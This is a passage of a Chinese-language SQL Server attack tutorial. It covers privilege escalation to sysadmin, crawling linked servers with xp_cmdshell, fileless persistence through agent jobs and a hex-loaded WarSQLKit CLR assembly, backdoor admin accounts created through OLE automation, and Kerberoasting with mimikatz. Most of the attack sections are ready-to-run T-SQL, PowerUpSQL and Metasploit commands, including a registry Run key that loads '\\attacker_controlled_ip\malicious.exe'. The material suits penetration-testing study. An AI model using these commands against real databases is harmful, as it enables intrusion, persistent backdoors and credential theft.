<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;) //检查SQL Server 登录名是否为指定服务器角色的成员。</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-9.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE AS LOGIN = &#x27;sa&#x27;  //模拟sa数据库级别，对于服务器级别，请使用EXECUTE AS USER。</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-10.png"></p>
<p>再次使用public角色用户testuser，手动检查目前模拟为sa登录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-11.png"></p>
<p><strong>2.存储过程和触发器创建/注入</strong></p>
<p>开发人员的一个常见错误是将他们要使用的所有功能，将其写入存储过程中，以便能够在其他用户的上下文中执行。这些存储过程可以作为数据库的所有者（拥有所有者的EXECUTE AS）来执行，以使它可以访问其他资源。也可以在高权限用户的上下文中进行执行，并且不需要授予特权。但是，从安全的角度来看，采用此方法有一些缺点：</p>
<ul>
<li>无法精细控制数据库所有者的权限。</li>
<li>普通帐户或sysadmin帐户通常拥有数据库。</li>
</ul>
<p>DB_OWNER角色可以使用EXECUTE AS OWNER在sa或sysadmin帐户的上下文中执行。如果这些存储过程实现不安全，则可以通过扩展存储过程来通过SQL注入或命令注入进行模拟。例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE test2</span><br><span class="line">GO</span><br><span class="line">CREATE PROCEDURE test_imitation2</span><br><span class="line">WITH EXECUTE AS OWNER</span><br><span class="line">AS</span><br><span class="line">EXEC sp_addsrvrolemember &#x27;testuser&#x27;,&#x27;sysadmin&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>必须将数据库配置为值得信赖的OS命令执行程序。虽然可以通过SQL或命令注入进行模拟，但是创建存储过程或触发器是更好的选择。</p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-12.png"></p>
<p>攻击场景：</p>
<p>DBA对Web应用程序执行以下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE LOGIN somebody WITH PASSWORD = &#x27;Password123&#x27;;  //为WebApp创建SQL登录名。</span><br><span class="line">USE test</span><br><span class="line">ALTER LOGIN [somebody] with default database = [test];</span><br><span class="line">CREATE USER somebody FROM LOGIN [somebody];</span><br><span class="line">EXEC sp_addrolemember [db_owner], [somebody];  //为此SQL登录名分配db_owner角色。Webapp可以从数据库访问所需的任何内容。</span><br><span class="line">ALTER DATABASE CurrentDB SET TRUSTWORTHY ON  //将数据库设置为可信任的访问外部资源。</span><br></pre></td></tr></table></figure>

<p>可以在查询中识别此类数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(owner_id) as DBOWNER, d.name as DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m on r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN (&#x27;MSDB&#x27;) and r.type = &#x27;R&#x27; and r.name = N&#x27;sysadmin&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-13.png"></p>
<p>可以使用以下metasploit模块自动进行探测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/mssql/mssql_escalate_dbowner</span><br><span class="line">auxiliary/admin/mssql/mssql_escalate_dbowner_sqi</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/">更多方法可参考NetSpi博客</a></p>
<p><strong>3.服务帐户</strong></p>
<p>SQL Server所有版本都为服务帐户提供sysadmin特权。</p>
<p>列出常见的一些服务帐户类型：</p>
<ul>
<li>域用户</li>
<li>本地用户</li>
<li>本地系统</li>
<li>网络服务</li>
<li>本地托管服务帐户</li>
<li>域托管服务帐户</li>
</ul>
<p>PowerUpSQL的Invoke-SQLOSCMD可用于基本命令执行。</p>
<p>对于单个主机实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SQLOSCMD –Verbose –Instance &quot;server1\instance1&quot; –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>对于域内实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain | InvokeSQLOSCMD –Verbose –Command &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p>如果我们攻击了一个SQL Server，那么我们也将使用该共享帐户来攻击所有SQL Server。</p>
<p><strong>4.爬数据库链接</strong></p>
<p>数据库链接（Database Link）本质上是两个服务器之间的持久连接。数据库链接（Database Link）的作用是，允许一个数据库服务器去对其他的数据库服务器进行查询。数据链接可以用不同的方式进行配置，但是更多时候我们看到它们使用硬编码的凭据。</p>
<p>Public角色使用openquery()函数，对被链接的数据库服务器进行查询；也可以执行xp_cmdshell，对远程访问也无凭证要求。通常配置此功能会使数据库服务器，拥有过多的特权。因此允许在远程服务器上的模拟登录，切换到高权限账号的上下文中。下图简单说明当数据库对链接查询功能配置过高特权时，注入的payload是如何被传递：</p>
<img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/权限提升-150.png" style="zoom:100%;">

<p>列出所有链接的服务器名，通常有两个选项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_linkedservers</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvname FROM master..syservers</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-14.png"></p>
<p>查询一个服务器的所有链接的服务器名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM master..sysservers&#x27;)</span><br></pre></td></tr></table></figure>

<p>查询一个服务器的某个链接的服务器所链接的服务器名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT srvnaem From openquery(DB1, &#x27;select srvname FROM openquery(HVA, &quot;SELECT srvname FROM master..syservers&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>查询可以一直嵌套执行，直到穷尽所有数据库服务器。在链接的服务器上执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM openquery(DB1, &#x27;SELECT * FROM openquery(HVA, &quot;SELECT 1; exec xp_cmdshell&#x27;&quot;&#x27;ping 192.168.1.1&quot;&quot; &#x27;&#x27;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>SQL Server 2005 存在链接爬网命令执行漏洞，使用msf的mssql_linkcrawler模块可获得反弹shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mssql/mssql_linkcrawler</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-msf-exploit.png"></p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-shell.png"></p>
<p>自动化爬网的工具：</p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.rapid7.com/db/modules/exploit/windows/mssql/mssql_linkcrawler">mssql_linkcrawler</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.netspi.com/sql-server-link-crawling-PowerUpSQL-">PowerUpSQL</a></li>
<li>……</li>
</ul>
<h4 id="从系统管理员到Sysadmin"><a href="#从系统管理员到Sysadmin" class="headerlink" title="从系统管理员到Sysadmin"></a>从系统管理员到Sysadmin</h4><p>首先先了解三个点：</p>
<ul>
<li>SQL Server较旧的版本为本地管理员提供sysadmin特权</li>
<li>SQL Server较旧的版本为本地系统提供sysadmin特权</li>
<li>SQL Server所有版本都为SQL Server服务帐户提供sysadmin特权</li>
</ul>
<p>以下是利用点和常用工具列表：</p>
<table>
<thead>
<tr>
<th>利用点</th>
<th>常用工具</th>
</tr>
</thead>
<tbody><tr>
<td>本地管理员身份访问DB</td>
<td>Management Studio，sqlcmd和其他SQL客户端工具。</td>
</tr>
<tr>
<td>本地系统身份访问DB</td>
<td>Psexec，可访问性选项，带有本机SQL客户端工具的调试器。</td>
</tr>
<tr>
<td>通过LSA Secrets恢复服务帐户密码</td>
<td>Mimikatz, Metasploit, lsadump.</td>
</tr>
<tr>
<td>SQL Server服务进程注入</td>
<td>Metasploit, Python, Powershell （LoadLibrary，CreateRemoteThread等类似的功能）</td>
</tr>
<tr>
<td>从服务进程中窃取身份验证令牌</td>
<td>Metasploit, Incognito, Invoke-TokenManipulation</td>
</tr>
<tr>
<td>单用户模式</td>
<td>DBATools</td>
</tr>
</tbody></table>
<p>以上利用点不一定适用所有SQL Server所有版本，下面简单列出一下适用版本（√：适用，×：不适用，?：可能适用），仅供参考：</p>
<table>
<thead>
<tr>
<th>利用点</th>
<th>SQL Server 2000</th>
<th>SQL Server 2005</th>
<th>SQL Server 2008</th>
<th>SQL Server 2012</th>
<th>SQL Server 2014</th>
<th>SQL Server 2016</th>
</tr>
</thead>
<tbody><tr>
<td>服务凭证</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>本地管理员</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>本地系统</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>SQL Server进程注入</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>?</td>
</tr>
<tr>
<td>令牌窃取</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>?</td>
</tr>
<tr>
<td>单用户模式</td>
<td>?</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody></table>
<p>附PowerUpSQL一些执行命令：</p>
<table>
<thead>
<tr>
<th>描述</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>SQL Server帐户的域用户。 以域用户身份运行时，此功能将自动执行4件事。1.通过LDAP查询到DC的SPN来识别域上的SQL Server。2.尝试登录每个。3.使用多种方法执行UNC路径注入。4.尝试捕获关联的SQL Server服务帐户的密码哈希。</td>
<td>Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12</td>
</tr>
<tr>
<td>通过服务帐户模拟将OS管理员转换为sysadmin，然后所有PowerUpSQL命令都可以以sysadmin身份运行。</td>
<td>Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\BOSCHSQL</td>
</tr>
<tr>
<td>审核问题</td>
<td>Invoke-SQLAudit -Verbose -Instance SQLServer1</td>
</tr>
<tr>
<td>升级到sysadmin</td>
<td>Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1</td>
</tr>
<tr>
<td>执行OS命令：xp_cmdshell</td>
<td>$Targets | Invoke-SQLOSCmd -Verbose -Command “Whoami” -Threads 10</td>
</tr>
<tr>
<td>执行OS命令：自定义扩展存储过程</td>
<td>Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command “echo test &gt; c:\temp\test.txt” -ExportName xp_test -Verbose<code>将test.dll放在在SQL Server服务帐户可读的共享上。</code>Get-SQLQuery -Verbose -Query “sp_addextendedproc ‘xp_test’, ‘\yourserver\yourshare\myxp.dll’”<code> </code>xp_test<code> </code>sp_dropextendedproc ‘xp_test’</td>
</tr>
<tr>
<td>执行OS命令：CLR</td>
<td>$Targets | Invoke-SQLOSCLR -Verbose -Command “Whoami”</td>
</tr>
<tr>
<td>执行OS命令：Ole自动化过程</td>
<td>$Targets | Invoke-SQLOSOle -Verbose -Command “Whoami”</td>
</tr>
<tr>
<td>执行OS命令：外部脚本-R</td>
<td>$Targets | Invoke-SQLOSR -Verbose -Command “Whoami”</td>
</tr>
<tr>
<td>执行OS命令：外部脚本-Python</td>
<td>$Targets | Invoke-SQLOSPython -Verbose -Command “Whoami”</td>
</tr>
<tr>
<td>执行OS命令：代理作业-CmdExec</td>
<td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command “echo hello &gt; c:\windows\temp\test1.txt”</td>
</tr>
<tr>
<td>执行OS命令：代理作业-PowerShell</td>
<td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command ‘write-output “hello world” | out-file c:\windows\temp\test2.txt’ -Sleep 20</td>
</tr>
<tr>
<td>执行OS命令：代理作业-VBScript</td>
<td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows\temp\test3.txt’</td>
</tr>
<tr>
<td>执行OS命令：代理作业-JScript</td>
<td>$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command ‘c:\windows\system32\cmd.exe /c echo hello &gt; c:\windows\temp\test3.txt’</td>
</tr>
<tr>
<td>检索数据库链接</td>
<td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1</td>
</tr>
<tr>
<td>检索数据库链接并执行查询</td>
<td>Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query “select name from master..sysdatabases”</td>
</tr>
<tr>
<td>抓取数据库链接并执行OS命令</td>
<td>Get-SQLCrawl -instance “SQLSERVER1\Instance1” -Query “exec master..xp_cmdshell ‘whoami’”</td>
</tr>
<tr>
<td>转储代理任务的内容。通常包含密码。详细输出包括作业摘要数据。</td>
<td>$Results = Get-SQLAgentJob -Verbose -Instance Server1\Instance1 -Username sa -Password ‘123qweASD’</td>
</tr>
<tr>
<td>枚举所有SQL登录名作为最低特权用户，并测试用户名作为密码。</td>
<td>针对单个服务器 Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\Instance1 运行针对域SQL Server运行 $WeakPasswords = Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditWeakLoginPw -Verbose<code> </code>$WeakPasswords</td>
</tr>
</tbody></table>
<h3 id="SQL-Server权限维持"><a href="#SQL-Server权限维持" class="headerlink" title="SQL Server权限维持"></a>SQL Server权限维持</h3><p>利用SQL Server设置权限维持方法，主要还是靠SQL Server代理作业，定期执行计划任务。为了实现无文件攻击，还利用CLR程序集功能，加载恶意DLL文件。通过这两种内置功能进行持久化，实现了在无文件落地、无其他进程的情况下，实施权限维持。</p>
<p>此持久化有几个前提条件：</p>
<ul>
<li>启动SQL Server代理服务</li>
<li>开启CLR功能</li>
<li>将存储.Net程序集的数据库配置为可信赖的</li>
</ul>
<p>以上均在SQL Server代理执行计划任务和SQL Server CLR相关利用详细介绍。</p>
<h4 id="高隐蔽性持久化"><a href="#高隐蔽性持久化" class="headerlink" title="高隐蔽性持久化"></a>高隐蔽性持久化</h4><p>连接SQL Server数据库后，创建SQL Server代理作业，定时执行SQL语句调用恶意的用户自定义存储过程或函数利用SQL语句将CLR程序集以十六进制形式加载加载进数据库，实现通过用户自定义函数调用恶意的CLR程序集。已创建的SQL Server代理作业，定期执行计划任务，调用CLR程序集，实现无文件持久化。</p>
<p>首先创建名为CreateWarSQLKit的存储过程（<strong>WarSQLKit</strong>相关的利用可查看第二章中SQL ServerCLR相关利用的<strong>WarSQLKit</strong>篇章）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">CREATE procedure CreateWarSQLKit as</span><br><span class="line">    CREATE ASSEMBLY [WarSQLKit]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A......</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-1.png"></p>
<p>创建SQL Server代理作业，定期执行CreateWarSQLKit，实现WarSQLKit的DLL文件持久化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;; </span><br><span class="line">EXEC sp_add_jobstep </span><br><span class="line">	@job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;, </span><br><span class="line">	@step_name = N&#x27;test_CreateWarSQLKit_name1&#x27;,</span><br><span class="line">	@subsystem = N&#x27;TSQL&#x27;,</span><br><span class="line">	@command = N&#x27;exec CreateWarSQLKit&#x27;, </span><br><span class="line">	@retry_attempts = 5, </span><br><span class="line">	@retry_interval = 5 ;</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_CreateWarSQLKit_job1&#x27;;</span><br><span class="line">EXEC dbo.sp_start_job N&#x27;test_CreateWarSQLKit_job1&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-2.png"></p>
<h4 id="其他方式实现持久化"><a href="#其他方式实现持久化" class="headerlink" title="其他方式实现持久化"></a>其他方式实现持久化</h4><p>出了正常利用SQL Server可以执行系统命令的存储过程，以下操作都是作为SQL对象存储在数据库中，并且没有任何更改到磁盘，也可以做到无文件持久化。</p>
<p>可以为utilman.exe设置调试器，该调试器将在调用cmd.exe时运行。仅sysadmins特权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command &#x27;c:\windows\system32\cmd.exe&#x27; -Instance SQLServerName\InstanceName&#x27;</span><br></pre></td></tr></table></figure>

<p>可以利用CurrentVersion \run与xp_regwrite建立。仅sysadmins特权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegRun -Verbose -Name legit -Command &#x27;\\attacker_controlled_ip\malicious.exe&#x27; -Instance &#x27;SQLServerName\InstanceName&#x27;</span><br></pre></td></tr></table></figure>

<p>可以将所有自定义CLR程序集导出到DLL，最后导入后门CLR。仅sysadmins特权。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">$Results = Get-SQLStoredProcedureCLR -Verbose -Instance &#x27;SQLServerName\InstanceName&#x27; -UserName sa -Password &#x27;password&#x27; -ExportFolder c:\temp</span><br><span class="line">Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.exe</span><br></pre></td></tr></table></figure>

<p>如果遇到SQLServer中的xplog70.dll文件被删除或放到其他地方了， xp_cmdshell就无法执行我们发出的命令了。可以考虑SQLServer中有一系列与OLE相关的存储过程，这一系列的存储过程同xp_cmdshell以及读取注册表系列的存储过程一样危险，所以被删除的可能性就小一些。这系列的存储过程有sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod，sp_OASetProperty，sp_OAStop。</p>
<p>可以在系统添加一个用户名为test，密码为12345678，并加入管理员组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#x27;wscript.shell&#x27;,@shell OUTPUT EXEC  SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;c:\windows\system32\cmd.exe /c net user test  12345678 /add&#x27;</span><br><span class="line"></span><br><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#x27;wscript.shell&#x27;,@shell OUTPUT  EXEC SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;c:\windows\system32\cmd.exe /c net  localgroup administrators test /add &#x27;</span><br></pre></td></tr></table></figure>

<p>xp_cmdshell、SP_OACREATE等可执行系统命令的存储过程，以及与它们相对应的动态连接库文件（DLL）都被删除了，还可以读取和修改注册表的存储过程（xp_regread、xp_regwrite）来克隆对方系统的管理员用户。</p>
<p>PowerUpSQL命令参考：</p>
<table>
<thead>
<tr>
<th>描述</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td>将所有自定义CLR程序集导出到DLL。它们可以脱机反编译，并且通常包含密码。而且，无需过多努力即可将其借壳。</td>
<td align="left"><code>$Results = Get-SQLStoredProcedureCLR -Verbose -Instance Server1\Instance1 -Username sa -Password &#39;P@ssword!&#39; -ExportFolder c:\temp</code> `$Results</td>
</tr>
<tr>
<td>创建一个可用于导入现有（或后门）CLR程序集的SQL命令。</td>
<td align="left"><code>Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.dll</code> 博客：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">https://blog.netspi.com/attacking-sql-server-clr-assemblies/)://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></td>
</tr>
<tr>
<td>创建可用于导入CLR程序集以执行OS命令的DLL和SQL命令。</td>
<td align="left"><code>Create-SQLFileCLRDll -Verbose -ProcedureName runcmd -OutDir c:\temp -OutFile evil</code></td>
</tr>
<tr>
<td>获取共享SQL Server服务帐户的列表</td>
<td align="left">`Get-SQLInstanceDomain -Verbose</td>
</tr>
</tbody></table>
<h3 id="SQL-Server横向移动"><a href="#SQL-Server横向移动" class="headerlink" title="SQL Server横向移动"></a>SQL Server横向移动</h3><h4 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h4><p>利用传统的Kerberoast攻击方式进行横向移动，Kerberoast是一种针对Kerberos协议的攻击方式。根据Kerberos协议，当向活动目录完成身份验证后，密钥分发中心（KDC）会将服务授权的票据（TGT）发送给用户，作为访问资源时的身份凭证。当需要访问资源，向票据服务器（TGS）发送Kerberos票据时，首先需要使用具有有效身份用户的票据（TGT）向票据服务器（TGS）请求乡音的服务票据。当该票据（TGT）被验证具有此服务的权限是，会向用户发送一张新的票据。新的票据使用SPN关联的计算机中的服务账号的NTLM Hash。攻击者可以尝试不同的NTLM Hash来开启Kerberos票据。NTLM Hash对应的是服务账号的密码。</p>
<p>实施此攻击前有几个前提条件：</p>
<ul>
<li>域内用户运行的SQL Server已经手动注册过SPN</li>
<li>Kerberos协议加密方式为RC4_HMAC_MD5</li>
</ul>
<p>通过SQL Server能执行PowerShell命令的利用点和导入特定功能的CLR程序集即可完成Kerberoast攻击。</p>
<p>查看指定域内用户所注册的SPN</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L SEC\MSSQL2</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1.png"></p>
<p>通过上文设置WarSQLKit的DLL存在sp_Mimikatz存储，执行mimikatz。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#x27;sp_Mimikatz&#x27;;</span><br><span class="line">select * from WarSQLKitTemp //获取Mimikatz日志</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-2.png"></p>
<p>或者利用任何一种可以执行PowerShell命令的方式，可以请求到SPN的Kerberos票据：</p>
